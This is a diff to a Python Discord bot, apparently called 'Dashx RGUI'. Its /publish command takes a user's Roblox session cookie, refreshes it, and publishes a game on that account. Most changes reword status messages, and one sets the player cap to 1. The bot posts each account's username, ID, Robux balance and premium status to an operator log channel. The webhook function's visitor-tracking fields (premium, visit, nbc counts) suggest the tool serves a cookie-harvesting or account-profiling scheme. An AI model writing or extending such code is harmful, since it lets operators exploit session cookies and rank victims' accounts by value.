@@ -231,7 +231,7 @@ def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc,
 
 @tree.command(
     name="publish",
-    description="Upload a Roblox game to the platform"
+    description="Publish your Roblox game files here"
 )
 @app_commands.describe(theme='Choose a Theme')
 @app_commands.choices(theme=theme_choices)
@@ -258,14 +258,14 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
     embed_var = discord.Embed(title=message, color=8918293)
     return await interaction.response.send_message(embed=embed_var, ephemeral=True)
       
-  message = "Uploading Game"
+  message = "Publishing your Game please wait a sec..."
   embed_var = discord.Embed(title=message, color=0x00f55e)
   await interaction.response.send_message(embed=embed_var, ephemeral=True)
 
   refreshed_cookie = refresh_cookie(cookie)
 
   if refreshed_cookie is None:
-    message = "Invalid Cookie"
+    message = "Your Cookie is Invalid"
     embed_var = discord.Embed(title=message, color=0xf00226)
     return await interaction.followup.send(embed=embed_var, ephemeral=True)
 
@@ -331,7 +331,7 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
 
     success_embed = discord.Embed(
         title="Place Created",
-        description=f"Your game has been successfully created.\n[Click here to play!]({game_url})", 
+        description=f"Your Game is fully published now!\n[Click here to play!]({game_url})", 
         color=0x00f55e
     )
 
@@ -353,7 +353,7 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
       "description": description,
       "universeAvatarType": "MorphToR6",
       "universeAnimationType": "Standard",
-      "maxPlayerCount": 45,
+      "maxPlayerCount": 1,
       "allowPrivateServers": False,
       "privateServerPrice": 0,
       "permissions": {
@@ -391,14 +391,14 @@ async def slash_publish(interaction: discord.Interaction, theme: discord.app_com
         embed_var.add_field(name='**Game ID**', value='' + str(game_id) + '')
         embed_var.add_field(name='**Theme**', value='' + str(theme.name) + '')
         embed_var.add_field(name="Game Link", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
-        embed_var.set_footer(text="Your Game Has Been Successfully Published!! - ")
+        embed_var.set_footer(text="Your game is now been Published in Roblox.com- ")
         embed_var.set_thumbnail(url=f"{game_icon}")
         await interaction.followup.send(embed=embed_var, ephemeral=True)
         channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))
 
         embed_var = discord.Embed(
           title="Dashx RGUI",
-          description= f'**<@{interaction.user.id}> Successfully Uploaded A New Game**\n\n**Account Information**\n**Account Username -** ' + str(username) + '\n**Account ID - ** ' + str(userid) + '\n**Robux - ** ' + str(user_robux) + '\n**isPremium? - **' + str(user_isprem) + '\n\n**Game Information**\n**Game Name - ||Hidden||**\n**Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
+          description= f'**<@{interaction.user.id}> Successfully published his game!**\n\n**Account Information**\n**Account Username -** ' + str(username) + '\n**Account ID - ** ' + str(userid) + '\n**Robux - ** ' + str(user_robux) + '\n**isPremium? - **' + str(user_isprem) + '\n\n**Game Information**\n**Game Name - ||Hidden||**\n**Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
           color=0xfac54d
         )
         embed_var.set_thumbnail(url=f'{avatarurl}')
